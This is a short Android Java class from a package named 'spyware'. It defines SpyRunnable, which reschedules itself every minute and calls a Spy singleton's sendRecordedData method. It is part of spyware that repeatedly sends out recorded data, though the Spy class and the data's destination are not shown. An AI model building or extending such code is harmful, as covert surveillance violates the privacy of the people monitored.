package com.example.cristianturetta.spyware;

import android.os.AsyncTask;
import android.os.Handler;

public class SpyRunnable implements Runnable {
    private Handler handler = new Handler();
    private Spy spy = Spy.getInstance();


    @Override
    public void run() {
        handler.postDelayed(this, 60000);
        spy.sendRecordedData();

    }
}